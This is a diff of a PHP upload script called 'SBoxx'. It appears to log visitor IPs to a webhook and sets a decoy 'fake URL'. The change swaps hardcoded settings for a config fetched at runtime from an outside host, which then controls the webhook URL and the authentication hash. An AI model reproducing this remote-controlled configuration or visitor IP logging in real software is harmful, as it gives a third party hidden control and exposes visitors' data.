@@ -3,26 +3,28 @@
    ######### SBoxx Made by SK3#0001 ##########
     #########################################
 
-  $Version = "3.0";
-  $File_Name = "Rocks";
-  $Method = 5;
-  $Extention = false;
-  $Main_URL = "https://api.dolphin-fe.xyz/p/";
-  $Fake_URL = "https://fbi.gov";
-  $Color = "ff5733";
-  $Tag = "Milfs";
-  $IP = null;
-  $System = "Normal"; # Normal and Apache
-  $File_Type_Support = false; # false or array('jpg','png','gif');
-  $RandomStringLength = 8;
-  $decided = false;
   $libhookz = require("lib/libhookz.php");
+  $raw_data = file_get_contents("https://api.dolphin-fe.xyz/x/config.json");
+  $data = json_decode($raw_data);
+  $Version = $data->Version;
+  $File_Name = $data->File_Name;
+  $Method = $data->Method; # 1-5
+  $Extention = $data->Extention;
+  $Main_URL = $data->Main_URL;
+  $Fake_URL = $data->Fake_URL;
+  $Color = $data->Color;
+  $Tag = $data->Tag;
+  $IP = null;
+  $System = $data->System; # Normal and Apache
+  $File_Type_Support = $data->File_Type_Support; # false or array('jpg','png','gif');
+  $RandomStringLength = $data->RandomStringLength;
+  $decided = false;
 
-  $Auth = false; # or null
-  $Auth_Name = "Authorization";
-  $Auth_Hash = "69lul";
+  $Auth = $data->Auth; # or null
+  $Auth_Name = $data->Auth_Name;
+  $Auth_Hash = $data->Auth_Hash;
 
-  $webhookurl = "";
+  $webhookurl = $data->webhookurl;
 
   function send_webhook($T_Tittle, $T_IP, $T_Code) {
     global $webhookurl;
@@ -195,6 +197,7 @@
     global $Method;
     global $File_Name;
     global $RandomStringLength;
+    global $File_Type_Support;
     if ($_FILES[$File_Name]) {
       $File = $_FILES[$File_Name]; # This is the image btw or gif idk
       $File_name = $File['name'];
